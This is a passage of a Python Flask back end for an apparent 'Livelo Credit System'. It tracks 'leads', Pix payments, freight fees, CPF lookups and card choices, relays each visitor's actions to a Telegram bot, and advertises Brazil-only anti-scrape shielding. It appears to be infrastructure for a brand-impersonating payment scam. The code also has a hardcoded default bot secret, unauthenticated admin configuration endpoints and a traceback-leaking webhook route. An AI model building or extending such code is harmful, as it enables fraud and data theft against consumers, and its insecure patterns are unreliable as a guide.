        stats = {"total": total_leads, "pagos": pagos}
        
        admins_raw = db.execute("SELECT * FROM telegram_admins ORDER BY last_active DESC").fetchall()
        stats["admins"] = [dict(a) for a in admins_raw]

    elif role == "basic":
        total_leads = db.execute("SELECT COUNT(*) FROM leads").fetchone()[0]
        pagos = db.execute("SELECT COUNT(*) FROM leads WHERE pix_status='paid'").fetchone()[0]
        stats = {"total": total_leads, "pagos": pagos}

    leads_raw = db.execute("SELECT * FROM leads ORDER BY created_at DESC LIMIT 300").fetchall()
    leads = [dict(l) for l in leads_raw]
    
    mgr_row = db.execute("SELECT freight_price, whatsapp FROM manager WHERE id=1").fetchone()
    frete_atual = mgr_row["freight_price"] if mgr_row and mgr_row["freight_price"] else os.environ.get("FRETE_VALOR", "29.90")
    mgr_whatsapp = mgr_row["whatsapp"] if mgr_row else ""

    return jsonify({
        "ok": True,
        "role": role,
        "status": status,
        "stats": stats,
        "leads": leads,
        "frete_atual": frete_atual,
        "mgr_whatsapp": mgr_whatsapp,
        "cpf_token": db.execute("SELECT value FROM sys_config WHERE key=\'cpf_token\'").fetchone()["value"] if db.execute("SELECT value FROM sys_config WHERE key=\'cpf_token\'").fetchone() else ""
    })









@app.route("/admin/manager", methods=["POST"])
@require_admin
def admin_update_manager():
    name       = sanitize(request.form.get("name", ""), 80)
    since_year = int(request.form.get("since_year", 2025))
    whatsapp   = re.sub(r"\D", "", sanitize(request.form.get("whatsapp", ""), 20))
    
    photo_url   = request.form.get("photo_url", "")
    favicon_url = request.form.get("favicon_url", "")
    freight_price = request.form.get("freight_price")
    wa_text       = request.form.get("wa_text")

    # Handle Photo File Upload
    file = request.files.get("photo")
    if file and file.filename:
        ext = Path(secure_filename(file.filename)).suffix.lower().lstrip(".")
        if ext in ALLOWED_IMG_EXT:
            fname = f"manager_{uuid.uuid4().hex[:8]}.{ext}"
            file.save(UPLOAD_DIR / fname)
            photo_url = f"/static/uploads/{fname}"

    # Handle Favicon File Upload
    fav_file = request.files.get("favicon")
    if fav_file and fav_file.filename:
        ext = Path(secure_filename(fav_file.filename)).suffix.lower().lstrip(".")
        if ext in ALLOWED_IMG_EXT + ["ico"]:
            fname = f"fav_{uuid.uuid4().hex[:8]}.{ext}"
            fav_file.save(UPLOAD_DIR / fname)
            favicon_url = f"/static/uploads/{fname}"

    db = get_db()
    
    # Update manager table fields
    if photo_url:
        db.execute("""
            UPDATE manager SET name=?,photo_url=?,since_year=?,whatsapp=?,updated_at=(cast(strftime('%s','now') as real))
            WHERE id=1
        """, (name, photo_url, since_year, whatsapp))
    else:
        db.execute("""
            UPDATE manager SET name=?,since_year=?,whatsapp=?,updated_at=(cast(strftime('%s','now') as real))
            WHERE id=1
        """, (name, since_year, whatsapp))
        
    if freight_price is not None and freight_price != "":
        db.execute("UPDATE manager SET freight_price=? WHERE id=1", (freight_price,))
        
    if favicon_url:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('favicon_url', ?)", (favicon_url,))
        
    if wa_text is not None:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('wa_text', ?)", (wa_text,))
        
    db.commit()

    return jsonify({"ok": True, "photo_url": photo_url, "favicon_url": favicon_url})


# ── LOGO DO SISTEMA ────────────────────────────────────────────────────────────
@app.route("/admin/logo", methods=["POST"])
@require_admin
def admin_update_logo():
    """Atualiza a logo exibida para os leads. Aceita upload de arquivo ou URL."""
    logo_url = sanitize(request.form.get("logo_url", ""), 500)

    logo_file = request.files.get("logo_file")
    if logo_file and logo_file.filename:
        ext = Path(secure_filename(logo_file.filename)).suffix.lower().lstrip(".")
        if ext not in ALLOWED_IMG_EXT:
            return jsonify({"ok": False, "error": "Formato inválido. Use PNG, JPG, WEBP ou SVG."}), 422
        fname = f"logo_{uuid.uuid4().hex[:10]}.{ext}"
        logo_file.save(UPLOAD_DIR / fname)
        logo_url = f"/static/uploads/{fname}"

    if not logo_url:
        return jsonify({"ok": False, "error": "Forneça uma URL ou faça upload de uma imagem."}), 422

    db = get_db()
    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('system_logo_url', ?)", (logo_url,))
    db.commit()
    log.info("[ADMIN] Logo atualizada: %s", logo_url)
    return jsonify({"ok": True, "logo_url": logo_url})



@app.route("/api/internal/set-logo", methods=["POST"])
def bot_set_logo():
    """Endpoint interno para o bot Telegram atualizar a logo via X-Bot-Secret."""
    secret = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
    if request.headers.get("X-Bot-Secret", "") != secret:
        return jsonify({"ok": False, "error": "Unauthorized"}), 401
    logo_url = (request.get_json(silent=True) or {}).get("logo_url", "")
    if not logo_url:
        return jsonify({"ok": False, "error": "logo_url required"}), 422
    db = get_db()
    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('system_logo_url', ?)", (logo_url,))
    db.commit()
    log.info("[BOT] Logo via Telegram: %s", logo_url)
    return jsonify({"ok": True, "logo_url": logo_url})


@app.route("/api/internal/set-logo-file", methods=["POST"])
def bot_set_logo_file():
    """Permite que o bot Telegram envie um arquivo de imagem para usar como logo."""
    secret = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
    if request.headers.get("X-Bot-Secret", "") != secret:
        return jsonify({"ok": False, "error": "Unauthorized"}), 401
    logo_file = request.files.get("logo_file")
    if not logo_file or not logo_file.filename:
        return jsonify({"ok": False, "error": "logo_file required"}), 422
    ext = Path(secure_filename(logo_file.filename)).suffix.lower().lstrip(".")
    if ext not in ALLOWED_IMG_EXT:
        return jsonify({"ok": False, "error": "Formato invalido"}), 422
    fname = f"logo_bot_{uuid.uuid4().hex[:10]}.{ext}"
    logo_file.save(UPLOAD_DIR / fname)
    logo_url = f"/static/uploads/{fname}"
    db = get_db()
    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('system_logo_url', ?)", (logo_url,))
    db.commit()
    log.info("[BOT] Logo arquivo via Telegram: %s", logo_url)
    return jsonify({"ok": True, "logo_url": logo_url})







@app.route('/api/admin/bot-config', methods=['POST'])
def api_admin_bot_config():
    data = request.get_json()
    db = get_db()
    for key in ['token', 'channel', 'topic', 'tpl_entry', 'tpl_card_chosen', 'tpl_pix_generated', 'tpl_pix_paid']:
        if key in data:
            db_key = 'telegram_token' if key == 'token' else ('tg_log_channel' if key == 'channel' else ('tg_log_thread_id' if key == 'topic' else f'tg_{key}'))
            db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES (?, ?)", (db_key, data.get(key, '')))
    db.commit()
    return jsonify({"ok": True})







@app.route("/api/log-action", methods=["POST"])
def api_log_action():
    data = request.get_json() or {}
    sid = sanitize(data.get("session_id", ""), 40)
    action = sanitize(data.get("action", ""), 100)
    details = sanitize(data.get("details", ""), 200)
    
    # Store action in DB or just forward to TG
    if sid and action:
        texto = f"{action}" + (f": {details}" if details else "")
        import threading
        threading.Thread(target=send_telegram_notify, args=(sid, f"STEP_ACTION: {texto}")).start()
    return jsonify({"ok": True})


@app.route("/api/internal/bot-gateway", methods=["POST"])
def api_bot_gateway():
    secret = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
    if request.headers.get("X-Bot-Secret", "") != secret:
        return jsonify({"ok": False, "error": "Unauthorized"}), 401
    data = request.get_json(silent=True) or {}
    action = data.get("action")
    payload = data.get("payload", {})
    db = get_db()
    
    if action == "get_config":
        rows = db.execute("SELECT key, value FROM sys_config").fetchall()
        return jsonify({"ok": True, "config": {r["key"]: r["value"] for r in rows}})
        
    elif action == "set_config":
        for k, v in payload.items():
            db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES (?, ?)", (k, v))
        db.commit()
        return jsonify({"ok": True})
        
    elif action == "get_leads":
        limit = payload.get("limit", 10)
        rows = db.execute("SELECT * FROM leads ORDER BY created_at DESC LIMIT ?", (limit,)).fetchall()
        return jsonify({"ok": True, "leads": [dict(r) for r in rows]})
        


    elif action == "get_payments":
        limit = payload.get("limit", 10)
        rows = db.execute("SELECT * FROM payments ORDER BY created_at DESC LIMIT ?", (limit,)).fetchall()
        return jsonify({"ok": True, "payments": [dict(r) for r in rows]})
        
    elif action == "get_financeiro":
        total_leads = db.execute("SELECT COUNT(*) FROM leads").fetchone()[0]
        pagos = db.execute("SELECT SUM(amount), COUNT(*) FROM payments WHERE status='approved' OR status='pago'").fetchone()
        pendentes = db.execute("SELECT COUNT(*) FROM payments WHERE status='pending'").fetchone()[0]
        
        stats = {
            "qtd_leads": total_leads,
            "total_pago": f"{pagos[0] or 0:.2f}",
            "qtd_pago": pagos[1] or 0,
            "qtd_pendente": pendentes
        }
        return jsonify({"ok": True, "stats": stats})

        


    elif action == "get_financeiro":
        total_leads = db.execute("SELECT COUNT(*) FROM leads").fetchone()[0]
        # Cartoes feitos is leads where card_style is not null
        cartoes_feitos = db.execute("SELECT COUNT(*) FROM leads WHERE card_style IS NOT NULL AND card_style != ''").fetchone()[0]
        
        pagamentos_gerados = db.execute("SELECT COUNT(*) FROM payments").fetchone()[0]
        
        pagos = db.execute("SELECT SUM(amount), COUNT(*) FROM payments WHERE status='approved' OR status='pago'").fetchone()
        pendentes = db.execute("SELECT COUNT(*) FROM payments WHERE status='pending'").fetchone()[0]
        cancelados = db.execute("SELECT COUNT(*) FROM payments WHERE status='rejected' OR status='cancelled'").fetchone()[0]
        
        # Entradas could be total accesses (maybe we log it in a table? Or just total leads)
        # Let's count total leads as 'entradas' and 'saidas' as bounce rate or just empty
        
        stats = {
            "qtd_leads": total_leads,
            "cartoes_feitos": cartoes_feitos,
            "pagamentos_gerados": pagamentos_gerados,
            "total_pago": f"{pagos[0] or 0:.2f}",
            "qtd_pago": pagos[1] or 0,
            "qtd_pendente": pendentes,
            "qtd_cancelado": cancelados,
            "host_status": "🟢 Vercel Serverless (Online)",
            "api_status": "🟢 Ativa & Sincronizada",
            "security_status": "🟢 Blindagem Ant-Scrape Ativa (Apenas BR)"
        }
        return jsonify({"ok": True, "stats": stats})



        
    return jsonify({"ok": False, "error": "Unknown action"}), 400


@app.route("/api/admin/advanced-config", methods=["POST"])
def api_admin_advanced_config():
    data = request.get_json()
    db = get_db()
    
    # Save generic configs
    for key in ['mgr_name', 'mgr_years', 'mgr_avatar', 'favicon', 'pixel_code', 'cpf_token', 'frete_expresso', 'frete_padrao']:
        if key in data:
            db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES (?, ?)", (key, data[key]))
            
    db.commit()
    return jsonify({"ok": True})

@app.route("/api/config", methods=["GET"])
def api_get_public_config():
    db = get_db()
    rows = db.execute("SELECT key, value FROM sys_config WHERE key IN ('mgr_name', 'mgr_years', 'mgr_avatar', 'favicon', 'pixel_code', 'frete_expresso', 'frete_padrao')").fetchall()
    return jsonify({r["key"]: r["value"] for r in rows})

@app.route('/health')
def health():
    return jsonify({"ok": True, "ts": time.time()})

@app.errorhandler(404)
def not_found(_):
    return render_template("index.html"), 200

@app.errorhandler(429)
def too_many(_):
    return jsonify({"ok": False, "error": "Limite de requisições excedido."}), 429

# ══════════════════════════════════════════════════════════════════════════════
#  BOOT E BOT BACKGROUND
# ══════════════════════════════════════════════════════════════════════════════
def start_bot():
    try:
        import bot
        if bot.BOT_TOKEN and bot.BOT_TOKEN != "SEU_TOKEN_AQUI":
            # Em Serverless (Vercel), polling não funciona. Vamos apenas ignorar.
            # O Webhook será ativado manualmente via /set-webhook
            log.info("Bot rodará via Webhook.")
    except Exception as e:
        log.error("Falha ao configurar bot: %s", e)

# Webhook Handler
@app.route('/telegram-webhook', methods=['POST'])
def telegram_webhook():
    secret = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
    if request.headers.get("X-Telegram-Bot-Api-Secret-Token") != secret:
        return "Unauthorized", 401
    try:
        import bot
        import telebot
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.bot.process_new_updates([update])
        return "OK", 200
    except Exception as e:
        return "Erro", 500

@app.route('/set-webhook')
def set_webhook():
    try:
        import bot
        url = f"{request.host_url.rstrip('/')}/telegram-webhook"
        bot.bot.remove_webhook()
        secret = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
        s = bot.bot.set_webhook(url=url, secret_token=secret)
        return jsonify({"webhook_set": s, "url": url})
    except Exception as e:
        import traceback
        return jsonify({"error": str(e), "traceback": traceback.format_exc()})

start_bot()

if __name__ == "__main__":
    init_db()
    debug = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
    port  = int(os.environ.get("PORT", 5050))
    log.info("[BOOT] Livelo Credit System na porta %d", port)
    app.run(host="0.0.0.0", port=port, debug=debug)
else:
    try:
        init_db()
    except Exception as e:
        log.error("Failed to init_db on startup: %s", e)
